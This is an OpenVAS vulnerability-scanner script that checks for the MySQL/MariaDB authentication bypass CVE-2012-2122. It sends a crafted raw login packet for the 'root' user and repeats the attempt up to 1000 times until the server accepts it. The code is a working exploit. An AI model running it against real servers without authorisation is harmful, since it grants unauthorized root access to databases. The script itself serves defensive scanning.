###############################################################################
# OpenVAS Vulnerability Test
# $Id: mysql_auth_bypas_cve_2012_2122.nasl 12 2013-10-27 11:15:33Z jan $
#
# MySQL Authentication Bypass
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "MySQL is prone to an Authentication Bypass.
Successful exploitation will yield unauthorized access to the database.

All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.23 are
vulnerable.

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.
MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103492";
CPE = "cpe:/a:mysql:mysql";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(53911);
 script_cve_id("CVE-2012-2122");
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 12 $");
 script_name("MySQL Authentication Bypass");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://bugs.mysql.com/bug.php?id=64884");
 script_xref(name : "URL" , value : "https://mariadb.atlassian.net/browse/MDEV-212");
 script_xref(name : "URL" , value : "http://www.h-online.com/open/news/item/Simple-authentication-bypass-for-MySQL-root-revealed-1614990.html");
 script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2012/q2/493");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-06-11 18:38:54 +0200 (Mon, 11 Jun 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to login into the remote MySQL server");
 script_category(ACT_ATTACK);
 script_family("Databases");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_timeout(0);
 script_dependencies("mysql_version.nasl");
 script_require_keys("MySQL/installed");
 script_require_ports("Services/mysql", 3306);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("byte_func.inc");
include("host_details.inc");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port) {
  port = 3306;
}

if(!get_port_state(port))exit(0);
if(get_kb_item("MySQL/blocked"))exit(0);

sock = open_sock_tcp(port);
if(!sock)exit(0);

res =  recv(socket:sock, length:4);
if(!res)exit(0);

plen = ord(res[0]) + (ord(res[1])/8) + (ord(res[2])/16);
res =  recv(socket:sock, length:plen);

req = raw_string(0x50,0x00,0x00,0x01,0x05,0xa6,0x0f,0x00,0x00,0x00,0x00,0x01,0x21,0x00,0x00,0x00,
                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                 0x00,0x00,0x00,0x00,0x72,0x6f,0x6f,0x74,0x00,0x14,0x26,0xcd,0x8e,0x6a,0x43,0x44,
                 0x61,0x21,0xe7,0x96,0x8b,0x18,0xc3,0xdc,0x55,0xcc,0x5d,0xd6,0xa3,0xb0,0x6d,0x79,
                 0x73,0x71,0x6c,0x5f,0x6e,0x61,0x74,0x69,0x76,0x65,0x5f,0x70,0x61,0x73,0x73,0x77,
                 0x6f,0x72,0x64,0x00);


send(socket:sock,data:req);
res =  recv(socket:sock, length:4);

if(!res || strlen(res) < 4) {
  close(sock);
  exit(0);
}

plen = ord(res[0]) + (ord(res[1])/8) + (ord(res[2])/16);

res =  recv(socket:sock, length:plen);
if(!res || strlen(res) < plen)exit(0);

errno = ord(res[2]) << 8 | ord(res[1]);

if(errno != 1045) {
  exit(0);
}

for(i=0; i<1000; i++) {

  sock = open_sock_tcp(port);
  buf = recv(socket:sock, length:4);

  if(strlen(buf) < 4) {
    close(sock);
    continue;
  }

  plen = ord(buf[0]) + (ord(buf[1])/8) + (ord(buf[2])/16);
  buf = recv (socket:sock, length:plen);

  if(strlen(buf) < plen) {
    close(sock);
    continue;
  }

  send(socket:sock,data:req);

  recv = recv(socket:sock, length:4);

  if(strlen(recv) < 4) {
    close(sock);
    continue;
  }

  blen = ord(recv[0]) + (ord(recv[1])/8) + (ord(recv[2])/16);

  recv = recv (socket:sock, length:blen);

  if(strlen(recv) < blen) {
    close(sock);
    continue;
  }

  errno = ord(recv[2]) << 8 | ord(recv[1]);

  if(errno == 0 && (ord(recv[0]) == 0 && ord(recv[3]) == 2 && ord(recv[4]) == 0)) {
    security_hole(port:port);
    close(sock);
    exit(0);
  }

  close(sock);

}

exit(0);  
